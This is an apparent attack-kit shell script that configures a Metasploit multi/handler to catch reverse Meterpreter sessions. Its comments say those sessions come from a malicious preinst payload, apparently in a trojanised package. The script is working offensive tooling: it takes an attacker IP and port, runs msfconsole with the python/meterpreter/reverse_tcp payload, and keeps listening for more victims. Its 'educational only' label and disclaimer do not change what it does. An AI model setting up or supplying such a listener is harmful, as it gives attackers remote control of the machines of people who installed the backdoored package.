#!/bin/bash
# =============================================================================
# setup-listener.sh — Metasploit multi/handler reference script
# =============================================================================
#
# PURPOSE (EDUCATIONAL ONLY):
#   This script shows how to configure a Metasploit Framework multi/handler
#   to catch the reverse Meterpreter session initiated by the malicious
#   preinst payload.
#
# PREREQUISITES:
#   - Metasploit Framework installed (msfconsole available in PATH)
#   - Set LHOST and LPORT below to match the values used in msfvenom
#
# DISCLAIMER:
#   This is a REFERENCE ONLY. Do not use against systems you do not own
#   or have explicit written authorization to test.
#   See ../DISCLAIMER.md for the full legal notice.
#
# USAGE:
#   1. Edit LHOST and LPORT below to match your attacker IP and chosen port.
#   2. Run:  bash scripts/setup-listener.sh
# =============================================================================

# ---------------------------------------------------------------------------
# Configuration — edit these to match your msfvenom payload settings
# ---------------------------------------------------------------------------
LHOST="<YOUR_ATTACKER_IP>"   # e.g., 192.168.1.100
LPORT="4444"                  # e.g., 4444 — must match LPORT in msfvenom
# ---------------------------------------------------------------------------

# Validate that LHOST has been set
if [ "$LHOST" = "<YOUR_ATTACKER_IP>" ]; then
  echo "[!] ERROR: Please edit this script and set LHOST to your attacker IP."
  exit 1
fi

echo "[*] Starting Metasploit multi/handler listener..."
echo "[*] LHOST: ${LHOST}  |  LPORT: ${LPORT}"
echo "[*] Payload: python/meterpreter/reverse_tcp"
echo ""

# Launch msfconsole with the handler configured
msfconsole -q -x "
  use exploit/multi/handler;
  set payload python/meterpreter/reverse_tcp;
  set LHOST ${LHOST};
  set LPORT ${LPORT};
  set ExitOnSession false;
  exploit -j;
"
